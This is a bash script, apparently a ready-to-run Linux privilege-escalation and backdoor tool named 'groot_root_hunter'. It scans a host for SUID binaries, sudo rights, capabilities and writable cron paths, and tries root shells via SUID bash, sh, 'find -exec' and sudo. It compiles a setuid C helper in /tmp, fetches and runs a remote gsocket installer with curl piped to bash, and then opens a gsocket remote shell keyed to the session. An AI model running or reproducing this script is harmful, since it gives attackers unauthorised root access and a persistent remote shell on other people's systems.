#!/bin/bash
# groot_root_hunter.sh

echo "╔══════════════════════════════════════╗"
echo "║    GROOT - ROOT PRIVESC HUNTER       ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Generate unique key
KEY="ROOT_HUNT_$(date +%s)"
echo "[*] Session Key: $KEY"
echo ""

# Function to check and exploit SUID
check_suid_exploit() {
    echo "[1] Scanning for SUID binaries..."
    find / -perm -4000 -type f 2>/dev/null | while read binary; do
        echo "   Found: $binary"
        
        # Check if it's a known exploitable binary
        case "$binary" in
            "/bin/bash"|"/usr/bin/bash")
                echo "   [+] EXPLOITABLE: SUID bash!"
                echo "   [>] Exploiting: $binary -p"
                return "$binary"
                ;;
            "/bin/sh"|"/usr/bin/sh")
                echo "   [+] EXPLOITABLE: SUID sh!"
                echo "   [>] Exploiting: $binary -p"
                return "$binary"
                ;;
            "/usr/bin/find")
                echo "   [+] EXPLOITABLE: SUID find!"
                echo "   [>] Exploiting: find . -exec /bin/bash -p \\; -quit"
                return "find"
                ;;
            "/usr/bin/nmap")
                echo "   [+] EXPLOITABLE: SUID nmap!"
                echo "   [>] Exploiting: nmap --interactive"
                return "nmap"
                ;;
        esac
    done
    return 1
}

# Function to check sudo
check_sudo_exploit() {
    echo ""
    echo "[2] Checking sudo permissions..."
    if sudo -l 2>/dev/null | grep -q "(ALL)"; then
        echo "   [+] Can run ALL commands with sudo!"
        echo "   [>] Exploiting: sudo bash"
        return 0
    fi
    return 1
}

# Function to check capabilities
check_cap_exploit() {
    echo ""
    echo "[3] Checking Linux capabilities..."
    if command -v getcap &>/dev/null; then
        getcap -r / 2>/dev/null | while read line; do
            echo "   Found: $line"
            if echo "$line" | grep -q "cap_setuid"; then
                echo "   [+] EXPLOITABLE: cap_setuid found!"
                return 0
            fi
        done
    fi
    return 1
}

# Function to check cron jobs
check_cron_exploit() {
    echo ""
    echo "[4] Checking cron jobs..."
    if [ -w /etc/crontab ]; then
        echo "   [+] Writable: /etc/crontab"
        return 0
    fi
    
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -w "$dir" ]; then
            echo "   [+] Writable: $dir"
            return 0
        fi
    done
    return 1
}

# Function to try all exploits
try_exploits() {
    echo ""
    echo "[*] Attempting privilege escalation..."
    echo "========================================"
    
    # Try SUID bash/sh first
    if [ -u "/bin/bash" ]; then
        echo "[+] SUCCESS: Using SUID bash for root!"
        exec gsocket -s "$KEY" /bin/bash -p -i
    elif [ -u "/bin/sh" ]; then
        echo "[+] SUCCESS: Using SUID sh for root!"
        exec gsocket -s "$KEY" /bin/sh -p -i
    fi
    
    # Try sudo
    if sudo -l 2>/dev/null | grep -q "(ALL)"; then
        echo "[+] SUCCESS: Using sudo for root!"
        exec sudo gsocket -s "$KEY" /bin/bash -i
    fi
    
    # Try find SUID exploit
    if [ -u "/usr/bin/find" ]; then
        echo "[+] SUCCESS: Using SUID find for root!"
        /usr/bin/find . -exec gsocket -s "$KEY" /bin/bash -p \\; -quit
    fi
    
    # Create SUID exploit if possible
    echo "[*] Creating custom SUID exploit..."
    cat > /tmp/rootme.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
    
    if command -v gcc >/dev/null; then
        gcc /tmp/rootme.c -o /tmp/rootme 2>/dev/null
        if [ -f /tmp/rootme ]; then
            chmod +x /tmp/rootme
            # Try to make it SUID if we have some write access
            echo "[*] Attempting to get root via custom binary..."
            /tmp/rootme
        fi
    fi
    
    # Last resort: user shell
    echo "[-] No privilege escalation found"
    echo "[*] Starting user shell..."
    exec gsocket -s "$KEY" /bin/bash -i
}

# Main execution
main() {
    # Clean up old gsocket
    pkill -f "gsocket\|gs-netcat" 2>/dev/null
    sleep 2
    
    # Install gsocket if needed
    if ! command -v gsocket &>/dev/null; then
        echo "[*] Installing gsocket..."
        GS_NOINST=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>/dev/null
    fi
    
    # Run all checks
    check_suid_exploit
    check_sudo_exploit
    check_cap_exploit
    check_cron_exploit
    
    # Try exploits
    try_exploits
}

# Run main
main
